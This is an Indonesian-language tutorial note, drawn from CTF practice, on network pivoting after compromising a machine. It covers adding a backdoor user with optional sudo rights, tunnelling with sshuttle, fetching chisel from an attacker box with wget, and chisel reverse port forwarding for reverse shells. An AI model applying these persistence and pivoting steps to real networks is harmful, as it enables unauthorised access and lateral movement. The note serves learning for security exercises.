# Pivoting
---
sebuah teknik yang membuat kita mendapatkan akses ke network lain dari mesin yang sudah kita dapatkan/eksploitasi. Tujuannya agar kita bisa mengakses mesin pada network lain dalam satu jaringan dari mesin yang sama. [Baca Disini](https://medium.com/mii-cybersec/basic-network-pivoting-5aca38b4bfa1)

--- 
NOTES :
>Disini saya menggunakan metodologi yang saya buat dari hasil mengikuti event CTF mulai dari masuk ke networknya dan mendapatkan shellnya. Diingatkan kembali disini saya mempelajari tetapi tidak mendalami jadi mungkin ada miss pengertian pada beberapa penjelasan. Dan tentu saya bakal update jika saya benar-benar memahami pivoting dengan cara lain (Gambar akan menyusul jika ingat :D)

#### Requirements
---
1. Mesin yang terhubung dengan mesin lainnya (bisa cek menggunakan `ip a s`)
2. [Chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.7) sesuaikan dengan mesin (normalnya `amd64`)
3. sshuttle [`sudo apt install sshuttle`]

#### Steps to reproduce

> Note :
> Kasus disini tidak mengetahui password salah satu user/root nya

- Membuat Backdoor(?)
1. Pastikan mesin sudah mendapatkan **root** akses (melalui eksploitas) jika kalian tidak mengetahui password dari salah satu user/root nya

2. Buat sebuah user dan isi passwordnya (ketika passwd nanti disuruh isi passwordnya)
```bash
$ useradd johndoe
$ passwd johndoe
```

jika ingin user tersebut dibuat setara dengan root bisa ditambahkan di `/etc/sudoers` nya. [Bisa baca disini](https://linuxize.com/post/how-to-add-user-to-sudoers-in-ubuntu/)

- Tunneling via **sshuttle**
3. Setelah kita membuat user pada mesin kita ke Attacker Box/mesin kita untuk menjalankan perintah sshuttle
```bash
$ sudo sshuttle -r johndoe@<ip machine> <ip subnet>/24
```
untuk ip subnet ini berasal dari ip mesin yang akan kita pivoting, bisa dilihat di `ip a s`

> karena kita menggunakan sshuttle, jadi kita bisa mengakses langsung IP machine yang telah kita pivoting. Misal IP Machine yang kita pivoting terdapat services HTTP pada port 8080 maka kita bisa langsung akses misal 192.168.1.106:8080 pada browser
> 
> catatan :
> jika kalian melakukan **nmap** hasilnya pasti setiap port kebuka jadi jika mesin yang kalian dapet terdapat **nmap** (bisa check dengan `which nmap`) maka lakukan enumeration didalam mesinnya saja

- Port forwading via **chisel**
Lalu bagaimana kita ingin melakukan reverse shell atau yang lainnya? tentu saja dengan Port Forwarding yang dimana ini akan membuat port khusus yang saling menghubungkan antara **Target Machine <-> Attacker Box** 

Target Machine Side
4. Pada Mesin Target yang telah kita eksploitasi. Kita simpan chisel pada mesinnya dengan menggunakan wget pada mesinnya (jangan lupa nyalain `python3 -m http server 80` pada folder yang ada chiselnya)
```bash
$ wget http://<ip attackerbox>/chisel

# buat chisel jadi execute
$ chmod +x ./chisel
```

5. Setelah itu kita buat mesinnya menjadi sebuah sever menggunakan chisel
```bash
$ ./chisel server --reverse -p 5555
```

Attacker Box Side
6. Jalankan chisel pada attacker box 
```bash
$ ./chisel client <ip target machine>:5555 R:8000:127.0.0.1:8000
```
Bisa dilihat **R** pada perintah di atas merupakan port forwardingnya yang akan di forward di port 8000 pada localhost/mesin kita

> bisa check menggunakan `netstat -tpln` atau `ss -lt` apakah port yang kita forward di **Target Machine** sudah ada atau belum

Terus bagaimana jika kita ingin upload linpeas,dll pada mesin yang telah kita pivoting?
Dalam kasus saya, saya membuat chisel server dan client lagi pada tab terminal baru. Jadi saya membuat **1** untuk hasil **reverse shellnya** dan **1** lagi untuk **upload filenya**.